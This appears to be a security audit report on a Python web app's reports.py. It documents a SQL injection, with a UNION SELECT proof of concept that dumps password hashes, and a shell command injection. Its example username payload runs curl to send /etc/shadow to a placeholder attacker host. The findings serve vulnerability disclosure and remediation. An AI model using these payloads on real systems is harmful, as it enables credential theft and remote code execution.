# SG-3 INJ Results — reports.py

Partition: SG-3 (reports) | Class group: INJ | Agent: INJ trace / SG-3

## Disposition Summary

| # | Variable | Disposition | Sink | Class |
|---|----------|-------------|------|-------|
| 22 | `fmt` | SAFE | branch selector only (`if fmt == "pdf"`), no sink | — |
| 23 | `from_date` | CANDIDATE | reports.py:79-83 raw SQL f-string | CWE-89 SQLi |
| 24 | `to_date` | CANDIDATE | reports.py:79-83 raw SQL f-string | CWE-89 SQLi |
| 25 | `session[username]` | CANDIDATE | reports.py:107-108 shell command | CWE-78 cmd inj |
| 27 | `/generate` (no input) | SAFE | render_template_string of hardcoded constant (S8) | — |

---

## [VULN-301] SQL injection via from_date / to_date in report export

- **Input**: #23 `from_date`, #24 `to_date` — HTTP query params, GET /reports/export
- **Class**: CWE-89: SQL Injection
- **Severity**: High+ (unauth-forgeable session; full DB read via UNION on sqlite `users` table incl. password hashes)
- **Location**: reports.py:79-83 (`db.execute(query)` at :84)
- **Gate 0**: Not intended. Date filter is a feature; raw string interpolation into SQL is not.
- **Gate 1**: Reachable. `export()` registered via `reports_bp` (app.py:79), route `/reports/export`. PRODUCTION.
- **Gate 2a**: Attacker-controlled. `request.args.get("from_date"/"to_date")` reports.py:70-71 direct from HTTP query string.
- **Gate 2b**: No sanitization. Values interpolated verbatim into f-string SQL; no parameterization, no quoting/escaping between :70 and :84.
- **Gate 3**: New capability. `owner_id = {uid}` scopes normal query to caller's own documents; UNION SELECT escapes that scope to read `users` (password hashes) and any table — data the caller cannot otherwise reach. PoC: `?from_date=' UNION SELECT id,username,password FROM users--`.
- **Entry Point**: GET /reports/export
- **Data Flow**: request.args (reports.py:70-71) -> from_date/to_date -> f-string query (reports.py:79-83) -> db.execute (reports.py:84)
- **Root Cause**: User-controlled date params concatenated into SQL string instead of using parameterized query.
- **Exploitability**: High. sqlite `db.execute` runs one statement; UNION-based extraction straightforward. Requires forged session (hardcoded secret key, S14) — trivial given app.py:20.

---

## [VULN-302] Command injection via session username in wkhtmltopdf shell call

- **Input**: #25 `session["username"]` (via `session.get("username","user")`) — forgeable session field
- **Class**: CWE-78: OS Command Injection
- **Severity**: High+ (RCE / arbitrary OS command as app user)
- **Location**: reports.py:107-108 (`cmd = f"wkhtmltopdf {tmp_path} {out_path}"`; `subprocess.run(cmd, shell=True)`)
- **Gate 0**: Not intended. PDF rendering is a feature; unescaped session value in a `shell=True` command is not.
- **Gate 1**: Reachable. `export()` route registered (app.py:79); reached when `fmt=="pdf"` (reports.py:86). PRODUCTION.
- **Gate 2a**: Attacker-controlled. `session["username"]` set from login; session signed with hardcoded `secret_key` (app.py:20, S14) — forgeable, so username is attacker-chosen.
- **Gate 2b**: No sanitization. username -> `tmp_path`/`out_path` (reports.py:96,100) -> f-string cmd (reports.py:107) -> `subprocess.run(..., shell=True)` (reports.py:108). No shlex.quote, no allowlist.
- **Gate 3**: New capability. Arbitrary OS command execution on the server — e.g. `username = "alice; curl http://attacker/$(cat /etc/shadow) #"`. Not achievable via any other endpoint in scope.
- **Entry Point**: GET /reports/export?fmt=pdf
- **Data Flow**: forged session (app.py:20 secret) -> session["username"] (reports.py:95) -> tmp_path/out_path (reports.py:96,100) -> cmd f-string (reports.py:107) -> subprocess.run shell=True (reports.py:108)
- **Root Cause**: Forgeable session field interpolated into a `shell=True` command string without escaping.
- **Exploitability**: High+. Full RCE. Also note secondary path traversal on tmp_path/out_path (open() reports.py:97,111), but command injection subsumes it.

---

## Notes
- #22 `fmt`: used only as equality branch selector (reports.py:86); never reaches an injection sink. SAFE.
- #27 `/generate`: no user input; `render_template_string(GENERATE_TEMPLATE)` (reports.py:59) renders a hardcoded module constant (reports.py:35-53). No attacker-controlled template string -> not SSTI. SAFE (design-safe constant).
- No CROSS-CLASS flags: both confirmed candidates are INJ-class; NAV gates (CWE-915/639) not triggered — export operates on `session["user_id"]`-scoped documents, no external resource-ID param.
